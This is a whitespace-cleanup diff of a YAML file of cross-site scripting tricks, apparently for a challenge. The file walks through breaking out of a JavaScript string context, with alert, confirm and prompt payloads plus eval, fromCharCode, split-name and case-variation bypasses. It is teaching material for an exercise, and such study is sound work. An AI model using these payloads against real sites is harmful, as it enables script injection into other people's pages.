@@ -14,7 +14,7 @@ tricks:
     payload: |
       # Vulnerable code pattern:
       # var name = "%s"; document.write('Hello ' + name);
-      
+
       # Input is placed directly into JS string context
 
   - name: "Step 2: Break out of string context"
@@ -23,7 +23,7 @@ tricks:
     payload: |
       # Basic payload:
       ";alert('XSS');//
-      
+
       # Result: var name = "";alert('XSS');//";
       # The // comments out the trailing ";
 
@@ -33,13 +33,13 @@ tricks:
     payload: |
       # Using single quotes inside:
       ";alert('XSS');//
-      
+
       # Using template literals:
       ";alert(`XSS`);//
-      
+
       # Using String.fromCharCode:
       ";alert(String.fromCharCode(88,83,83));//
-      
+
       # Using eval:
       ";eval('alert(\"XSS\")');//
 
@@ -51,10 +51,9 @@ tricks:
       ";confirm('XSS');//
       ";prompt('XSS');//
       ";window['al'+'ert']('XSS');//
-      
+
       # If 'import' is blocked (like this challenge):
       # Just avoid using import, use alert directly
-      
+
       # Case variation (if not case-sensitive check):
       ";ALERT('XSS');//
-
